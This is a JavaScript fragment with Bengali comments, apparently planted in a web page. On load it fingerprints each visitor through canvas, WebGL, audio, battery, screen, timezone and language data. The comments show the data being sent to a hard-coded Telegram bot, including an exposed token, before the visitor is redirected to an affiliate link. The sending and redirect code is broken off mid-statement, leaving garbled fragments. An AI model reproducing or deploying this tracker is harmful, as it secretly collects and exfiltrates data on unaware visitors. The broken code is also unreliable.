    <script>
        // ===================== আপনার তথ্য দিন =====================
        const TG_BOT_TOKEN = "8651142215:AAHuKP53rRExlvBipq2EgcXWCOU4i-vZ7Do";
        const TG_CHAT_ID = "5575068712";
        const REDIRECT_URL = "https://coldredir.com/L?tag=d_5695957m_126646c_&site=5695957&ad=126646";

        // ========== ফিঙ্গারপ্রিন্ট জেনারেটর ==========
        function generateFingerprint() {
            var fp = "";
            
            // 1. ক্যানভাস (এডভান্সড ভার্সন)
            try {
                var canvas = document.createElement('canvas');
                var ctx = canvas.getContext('2d');
                canvas.width = 250;
                canvas.height = 80;
                
                // ব্যাকগ্রাউন্ড গ্রেডিয়েন্ট
                var gradient = ctx.createLinearGradient(0, 0, 250, 80);
                gradient.addColorStop(0, '#ff6b6b');
                gradient.addColorStop(0.5, '#4ecdc4');
                gradient.addColorStop(1, '#45b7d1');
                ctx.fillStyle = gradient;
                ctx.fillRect(0, 0, 250, 80);
                
                // টেক্সট লেয়ার ১
                ctx.font = 'bold 24px Arial';
                ctx.fillStyle = '#ffffff';
                ctx.shadowColor = 'rgba(0,0,0,0.5)';
                ctx.shadowBlur = 4;
                ctx.fillText('Fingerprint', 20, 40);
                
                // টেক্সট লেয়ার ২ (একটু ঘোরানো)
                ctx.save();
                ctx.translate(180, 30);
                ctx.rotate(0.2);
                ctx.font = '16px Courier New';
                ctx.fillStyle = '#ffff00';
                ctx.shadowBlur = 0;
                ctx.fillText('v2.0', 0, 0);
                ctx.restore();
                
                // ছোট বৃত্ত
                for (var i = 0; i < 10; i++) {
                    ctx.beginPath();
                    ctx.arc(10 + i * 25, 65, 5, 0, Math.PI * 2);
                    ctx.fillStyle = 'hsl(' + (i * 36) + ', 70%, 60%)';
                    ctx.fill();
                }
                
                fp += canvas.toDataURL().substring(50, 120);
            } catch(e) { fp += "canvas_error|"; }

            // 2. ওয়েবজিএল ফিঙ্গারপ্রিন্ট (গ্রাফিক্স কার্ড)
            try {
                var glCanvas = document.createElement('canvas');
                var gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
                if (gl) {
                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        fp += gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + "|";
                        fp += gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + "|";
                    } else {
                        fp += "webgl_no_debug|";
                    }
                    fp += gl.getParameter(gl.MAX_TEXTURE_SIZE) + "|";
                } else {
                    fp += "no_webgl|";
                }
            } catch(e) { fp += "webgl_error|"; }

            // 3. অডিও ফিঙ্গারপ্রিন্ট
            try {
                var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                var oscillator = audioCtx.createOscillator();
                var analyser = audioCtx.createAnalyser();
                oscillator.connect(analyser);
                oscillator.frequency.value = 440;
                oscillator.type = 'sine';
                
                var bufferLength = analyser.frequencyBinCount;
                var dataArray = new Uint8Array(bufferLength);
                analyser.getByteFrequencyData(dataArray);
                
                var audioHash = 0;
                for (var i = 0; i < 10; i++) {
                    audioHash += dataArray[i] || 0;
                }
                fp += audioHash + "|";
                audioCtx.close();
            } catch(e) { fp += "audio_error|"; }

            // 4. ব্যাটারি
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    window.batteryLevel = Math.round(battery.level * 100);
                    window.batteryCharging = battery.charging;
                });
            }

            // 5. টাচ সাপোর্ট ও মাল্টিটাচ
            fp += navigator.maxTouchPoints + "|";
            
            // 6. হার্ডওয়্যার কনকারেন্সি
            fp += (navigator.hardwareConcurrency || "unknown") + "|";
            
            // 7. ডিভাইস মেমোরি
            fp += (navigator.deviceMemory || "unknown") + "|";
            
            // 8. স্ক্রিন ডিটেইলস
            fp += screen.width + "x" + screen.height + "|";
            fp += screen.colorDepth + "|";
            fp += screen.pixelDepth + "|";
            
            // 9. টাইমজোন
            fp += Intl.DateTimeFormat().resolvedOptions().timeZone + "|";
            fp += new Date().getTimezoneOffset() + "|";
            
            // 10. প্ল্যাটফর্ম ও ভাষা
            fp += navigator.platform + "|";
            fp += navigator.language + "|";
            fp += navigator.languages ? navigator.languages.join(",") : "|";
            
            // 11. কুকি ও স্টোরেজ
            fp += navigator.cookieEnabled + "|";
            fp += typeof(Storage) !== 'undefined' ? "yes|" : "no|";
            
            // 12. ডু নট ট্র্যাক
            fp += navigator.doNotTrack || "not_set";
            
            // SHA-1 হ্যাশ তৈরি
            return sha1(fp);
        }

        // ========== SHA-1 হ্যাশ ফাংশন ==========
        function sha1(str) {
            function rotateLeft(n, b) { return (n << b) | (n >>> (32 - b)); }
            function toHexStr(n) { var s = "", v; for (var i = 7; i >= 0; i--) { v = (n >>> (i * 4)) & 0x0f; s += v.toString(16); } return s; }
            
            var blockstart, i, j, W = new Array(80), H0 = 0x67452301, H1 = 0xEFCDAB89, H2 = 0x98BADCFE, H3 = 0x10325476, H4 = 0xC3D2E1F0, A, B, C, D, E, temp;
            
            str = unescape(encodeURIComponent(str));
            var str_len = str.length;
            var word_array = [];
            for (i = 0; i < str_len - 3; i += 4) {
                j = str.charCodeAt(i) << 24 | str.charCodeAt(i + 1) << 16 | str.charCodeAt(i + 2) << 8 | str.charCodeAt(i + 3);
                word_array.push(j);
            }
            switch (str_len % 4) {
                case 0: i = 0x080000000; break;
                case 1: i = str.charCodeAt(str_len - 1) << 24 | 0x0800000; break;
                case 2: i = str.charCodeAt(str_len - 2) << 24 | str.charCodeAt(str_len - 1) << 16 | 0x08000; break;
                case 3: i = str.charCodeAt(str_len - 3) << 24 | str.charCodeAt(str_len - 2) << 16 | str.charCodeAt(str_len - 1) << 8 | 0x80; break;
            }
            word_array.push(i);
            while ((word_array.length % 16) != 14) word_array.push(0);
            word_array.push(str_len >>> 29);
            word_array.push((str_len << 3) & 0x0ffffffff);
            
            for (blockstart = 0; blockstart < word_array.length; blockstart += 16) {
                for (i = 0; i < 16; i++) W[i] = word_array[blockstart + i];
                for (i = 16; i <= 79; i++) W[i] = rotateLeft(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1);
                A = H0; B = H1; C = H2; D = H3; E = H4;
                for (i = 0; i <= 19; i++) { temp = (rotateLeft(A, 5) + ((B & C) | (~B & D)) + E + W[i] + 0x5A827999) & 0x0ffffffff; E = D; D = C; C = rotateLeft(B, 30); B = A; A = temp; }
                for (i = 20; i <= 39; i++) { temp = (rotateLeft(A, 5) + (B ^ C ^ D) + E + W[i] + 0x6ED9EBA1) & 0x0ffffffff; E = D; D = C; C = rotateLeft(B, 30); B = A; A = temp; }
                for (i = 40; i <= 59; i++) { temp = (rotateLeft(A, 5) + ((B & C) | (B & D) | (C & D)) + E + W[i] + 0x8F1BBCDC) & 0x0ffffffff; E = D; D = C; C = rotateLeft(B, 30); B = A; A = temp; }
                for (i = 60; i <= 79; i++) { temp = (rotateLeft(A, 5) + (B ^ C ^ D) + E + W[i] + 0xCA62C1D6) & 0x0ffffffff; E = D; D = C; C = rotateLeft(B, 30); B = A; A = temp; }
                H0 = (H0 + A) & 0x0ffffffff; H1 = (H1 + B) & 0x0ffffffff;
                H2 = (H2 + C) & 0x0ffffffff; H3 = (H3 + D) & 0x0ffffffff; H4 = (H4 + E) & 0x0ffffffff;
            }
            return toHexStr(H0) + toHexStr(H1) + toHexStr(H2) + toHexStr(H3) + toHexStr(H4);
        }

        // ========== মেইন ফাংশন ==========
        var fingerprint = generateFingerprint();
        var batteryLevel = "N/A";
        var batteryCharging = "N/A";

        // ব্যাটারি আপডেট
        if (navigator.getBattery) {
            navigator.getBattery().then(function(b) {
                batteryLevel = Math.round(b.level * 100) + "%";
                batteryCharging = b.charging ? "Yes" : "No";
            });
        }

        // আইপি ফেচ
        var publicIP = "Loading...";

        // টাইমআউট
        setTimeout(function() {

        }, 5000);

        // ========== টেলিগ্রামে পাঠানো ==========

                      "📺 **স্ক্রিন:** " + screen.width + "x" + screen.height + " (" + screen.colorDepth + "-bit)\n" +

                })
            }).catch(function(err) { console.log("Error:", err); });
        }

        // ২ সেকেন্ড পর রিডাইরেক্ট
        setTimeout(function() {
